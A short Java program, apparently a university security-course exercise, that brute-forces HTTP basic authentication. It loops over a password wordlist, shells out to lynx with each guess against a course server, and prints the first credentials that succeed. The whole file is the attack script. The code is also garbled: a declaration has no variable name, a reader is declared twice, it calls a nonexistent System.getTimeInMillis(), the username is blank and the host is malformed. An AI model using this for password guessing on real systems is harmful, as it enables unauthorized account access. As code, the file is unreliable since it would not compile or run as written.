
import java.net.*;
import java.*;
import java.io.*;
import java.util.GregorianCalendar;
public class Dictionary
{



    public void crackAddress(String fileName) throws Exception
    {
       String line,username="",passwd,pass;
       int flag=0,i;
       BufferedReader bf = new BufferedReader(new FileReader(fileName));
       Runtime run = Runtime.getRuntime();
       GregorianCalendar =new GregorianCalendar();
       while((passwd=bf.readLine().trim())!=null)
       {
           if((i=passwd.indexOf("\'"))!= -1)
                 {
                    passwd =passwd.substring(0,i)+("\\")+(passwd.substring(i,passwd.length()));
                 }

          System.out.println("Hack password with the word:"+passwd);
	      String command_line = "lynx http://sec-crack.cs.rmit.edu./SEC/2/ -auth="+username+":"+passwd+" -dump";
	      Process result = run.exec(command_line);
          BufferedReader bf = new BufferedReader(new InputStreamReader(result.getInputStream()));

        while((line=bf.readLine())!=null)
        {
           flag=1;
           break;

        }
        if(flag==1)
        {
           System.out.println("The username is: "+username+" The password is: "+passwd);
           break;
        }
       }
       GregorianCalendar end=new GregorianCalendar();
       double time = (double)(end.getTimeInMillis()-System.getTimeInMillis())/1e3;
       System.out.println("The attack use"+time+" seconds.");
    }

public static void main(String args[]) throws Exception
{
   Dictionary ds = new Dictionary();
   ds.crackAddress(args[0]);
}
}